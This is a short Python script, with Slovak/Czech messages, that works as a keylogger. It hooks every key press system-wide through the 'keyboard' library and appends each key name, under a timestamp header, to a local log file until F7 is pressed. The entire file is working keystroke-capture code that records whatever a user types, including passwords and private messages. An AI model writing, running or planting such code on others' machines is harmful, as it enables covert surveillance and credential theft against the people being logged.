import keyboard
import datetime
import os

if not os.path.exists("E:/CpKeyLogs/"):
    os.makedirs("E:/CpKeyLogs/")
    
#while True:
ActualDate = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
file_path = "E:/CpKeyLogs/StlaceneKlavesy.txt" # Change it by YOURS Directory

DlzkaSpolu = len(ActualDate) + len("Datum : ")

with open(file_path, "a") as file:
    file.write("\n+ " + "-" * DlzkaSpolu + " +\n")
    file.write("   Datum : " + ActualDate + "\n")
    file.write("+ " + "-" * DlzkaSpolu + " +\n")
    
def log_key(e):
    with open(file_path, "a") as file:
        file.write("Zmacklá klávesa : "+ e.name + "\n")

print("Press f7 for STOP Script")
keyboard.hook(log_key)
keyboard.wait("f7")
if keyboard.is_pressed("f7"):
    print("Zmacknute f7 ! Exitting...\n")
    with open(file_path, "a") as file:
        file.write("+ " + "-"*27 + " +\n")
        file.write("  Zmacknuté f7 ! Ukoncujem...\n")
        file.write("+ " + "-"*27 + " +\n")
